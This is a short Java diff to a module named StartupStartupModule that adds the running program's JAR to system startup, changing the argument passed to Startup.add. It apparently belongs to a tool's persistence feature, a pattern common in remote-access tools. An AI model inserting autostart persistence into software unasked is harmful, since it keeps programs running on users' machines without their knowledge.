@@ -19,7 +19,7 @@ public class StartupStartupModule extends StartupModule {
 		String currentJar = Utils.getJarFile().getAbsolutePath();
 
 		try {
-			Startup.add(Configuration.getName());
+			Startup.add(Configuration.getFileName());
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
